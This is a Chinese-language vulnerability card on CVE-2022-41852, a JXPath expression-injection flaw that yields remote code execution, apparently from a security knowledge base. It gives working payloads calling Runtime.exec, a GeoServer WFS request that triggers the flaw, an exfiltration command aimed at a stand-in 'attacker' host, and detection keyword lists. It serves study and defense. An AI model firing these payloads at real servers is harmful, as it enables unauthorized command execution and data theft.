---
id: web-java-expression-jxpath-static-method-invocation-rce
title: Apache Commons JXPath 1.3 表达式注入原语：getValue 中 exec(java.lang.Runtime.getRuntime(),'cmd') 调用任意静态方法执行命令（CVE-2022-41852）
type: scenario
domain: web
path: web/java/expression
technique: jxpath-expression-injection-java-method-invocation
aliases:
- CVE-2022-41852
- JXPath 表达式注入
- commons-jxpath RCE
- JXPathContext.getValue
- exec(java.lang.Runtime.getRuntime())
- JXPath standard extension functions
tags:
- java
- jxpath
- expression-injection
- rce
- xpath
- commons-jxpath
- cve
cve:
- CVE-2022-41852
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
affected_versions: commons-jxpath:commons-jxpath <= 1.3（原文标记）
verification:
  verified_by: verifier-V311
  verified_at: '2026-11-08T12:41:11+08:00'
  notes: 已对照原文 JXPath 章节与图12（.new/静态方法/实例方法三类 Standard Extension Functions）、图06/30 的 exec 触发与 CVE-2022-41852 链接核对；affected_versions <=1.3 与原文标记一致。属底层引擎原语，未单独复现；与 GeoServer 组件入口卡为不同层次，保留。
---

## 一句话结论

Apache Commons JXPath（≤1.3）在求值 XPath 表达式时支持"标准扩展函数"，可调用任意 public 静态方法、构造器与实例方法；当应用把用户可控字符串交给 `JXPathContext.getValue()` 等 API 求值时，表达式 `exec(java.lang.Runtime.getRuntime(), 'calc')` 会直接调用 `Runtime.exec` 执行命令（CVE-2022-41852）。

## 原理

- **JXPath 是什么**：JXPath 是 Apache 提供的 XPath Java 实现，用于遍历 JavaBean、DOM 及其他对象图，并提供扩展机制以支持自定义对象模型。
- **标准扩展函数即 Java 调用桥**：JXPath 文档给出的三类用法都能在表达式里完成任意 Java 调用：
  - 用 `.new` 调构造器：`com.myco.books.Book.new('John Updike')`；
  - 调 public 静态方法：`com.myco.books.Book.getBestBook('John Updike')`；
  - 调对象实例方法：`getAuthorsFirstName($book)`（等价于 `$book.getAuthorsFirstName()`）。
  - 函数参数中，第一个参数是目标对象/类：`exec(java.lang.Runtime.getRuntime(), 'calc')` 即以 `Runtime` 实例为目标调用 `exec`。
- **从表达式到 RCE**：因为表达式可调用任意 public 方法，攻击者可使用 `java.lang.Runtime.getRuntime().exec`、`ProcessBuilder`、脚本引擎、反射等任意可达类完成命令执行或代码执行。是否可未认证利用取决于上层应用是否把外部输入拼入 JXPath 表达式。
- **CVE-2022-41852**：commons-jxpath ≤1.3 未限制扩展函数可调用的类/方法，公开通告将其归类为 JXPath 表达式注入导致 RCE；本文的 GeoServer CVE-2024-36401 即 GeoTools 把属性名交给 commons-jxpath 求值后的实际利用。

## 触发条件

- 目标应用依赖 `commons-jxpath` ≤1.3，且存在把外部可控字符串传给 `JXPathContext.getValue()/iterate()` 等求值 API 的路径。
- 表达式未被白名单/沙箱限制（默认允许扩展函数）。
- 攻击者能控制表达式内容；是否需要认证取决于上层应用。
- 目标 JVM 允许调用 `Runtime`/`ProcessBuilder` 等类（默认允许）。

## 利用步骤

1. 定位 sink：代码中 `JXPathContext.getValue(userInput)`、`JXPathContext.newContext(obj).getValue(expr)` 等调用，且参数可由请求控制。
2. 构造最小表达式验证：`exec(java.lang.Runtime.getRuntime(), 'calc')`（Windows）或 `exec(java.lang.Runtime.getRuntime(), 'touch /tmp/jxpath_poc')`（Linux）。
3. 无回显时使用反连/带外：把命令换成 `curl http://attacker/$(whoami)`、`powershell -c ...`、写文件后再读取，或调用 ScriptEngine 执行更复杂载荷。
4. 若 `Runtime.exec` 被策略拦截，可尝试同机制的其它 public 静态方法/构造器/实例方法。

## PoC

```java
try {
    JXPathContext context = JXPathContext.newContext(null);
    context.getValue("exec(java.lang.Runtime.getRuntime(), 'calc')");
} catch (Exception e) {
    e.printStackTrace();
}
```

在 GeoServer CVE-2024-36401 中的实际落地形式（属性名被当作 JXPath 表达式求值）：

```xml
<wfs:GetPropertyValue service='WFS' version='2.0.0'
  xmlns:topp='http://www.openplans.org/topp'
  xmlns:fes='http://www.opengis.net/fes/2.0'
  xmlns:wfs='http://www.opengis.net/wfs/2.0'
  valueReference='exec(java.lang.Runtime.getRuntime(),"calc")'>
  <wfs:Query typeNames='topp:states'/>
</wfs:GetPropertyValue>
```

## 变体与关联

- **调用形式变体**：`.new` 构造器、静态方法、`getAuthorsFirstName($book)` 式实例方法；`exec(...)` 可换为其它 public 方法调用链。
- **命令形式变体**：Windows `calc`/`cmd /c`/PowerShell；Linux `touch`/`curl`/`bash -c`；无回显时用 DNS/HTTP 带外。
- **真实入口**：[[web-java-component-geoserver-cve-2024-36401-ogc-filter-propertyname-jxpath-rce]]（WFS GetFeature/WMS GetMap 的 PropertyName）、[[web-java-component-geoserver-wfs-getpropertyvalue-exec-rce]]（WFS GetPropertyValue 的 valueReference）。
- **边界**：若应用只把固定 XPath 模板与用户数据拼接为字符串字面量、或用 JXPath 但不解析用户函数调用，则不成立；升级 commons-jxpath 或禁用扩展函数后失效。

## 检测与防御

- **依赖与升级**：排查 `commons-jxpath` ≤1.3；升级到修复版本或移除依赖。
- **输入约束**：不要把用户输入直接作为 JXPath 表达式；必须使用时做严格白名单（只允许属性路径字符），禁止 `(`、`java.`、`exec`、`.new`、`getRuntime` 等。
- **检测**：日志/请求中出现 `exec(`、`java.lang.Runtime`、`getRuntime`、`ProcessBuilder`、`.new(`、`java.lang.Class` 等 JXPath 扩展函数特征；异常 `ClassCastException` 中出现 `ProcessImpl` 等命令执行对象。
- **加固**：JVM 层限制反射/脚本引擎；对使用了 JXPath 的组件做依赖清单与静态扫描。
